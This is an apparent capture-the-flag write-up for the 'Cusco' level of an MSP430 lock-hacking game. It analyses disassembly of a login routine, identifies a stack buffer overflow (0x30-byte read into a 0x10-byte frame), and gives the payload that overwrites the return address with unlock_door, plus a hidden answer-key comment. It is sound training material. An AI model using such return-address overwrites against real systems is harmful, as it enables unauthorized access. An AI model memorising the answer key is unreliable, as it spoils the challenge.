# Cusco
> partial source code is [here](./dump.asm)  
> **Vulnerability**: stack buffer overflow

## Analysis
Focus on the function `<login>`
```asm
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp                     ; sp = sp - 0x10
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>                 ; gets(sp, 0x30)
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	$+0xc <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	$+0x6 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```

From `4500:  3150 f0ff      add	#0xfff0, sp`, we know that the stack size is `0x10` bytes and at `451a`, it calls `gets(sp, 0x30)` which gets **maximum 0x30 bytes** of input on the stack.

### Vulnerability
**<u>0x30 > 0x10</u>** so there is a **stack buffer overflow** and `input[0x10]` will hold the return address of the function `<login>`.

## Exploit
0x10 bytes of padding + 0x2 bytes of address for `<unlock_door>` function, `0x4446` in little endian

<!-- solution: {'level_id': 5, 'input': '414141414141414141414141414141414644;'} -->
